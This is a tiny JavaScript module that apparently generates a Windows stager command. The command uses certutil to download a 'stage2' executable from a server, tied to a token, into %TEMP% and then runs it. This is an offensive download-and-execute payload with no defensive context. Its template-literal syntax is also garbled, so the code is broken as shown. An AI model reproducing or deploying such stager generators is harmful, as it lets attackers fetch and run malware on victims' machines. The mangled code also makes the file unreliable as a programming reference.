function generate(token, serverUrl) {
    return `certutil -urlcache -split -f "\( {serverUrl}/stage2?token= \){token}" %TEMP%\\h_\( {token}.exe && start %TEMP%\\h_ \){token}.exe`;
}

module.exports = { generate };
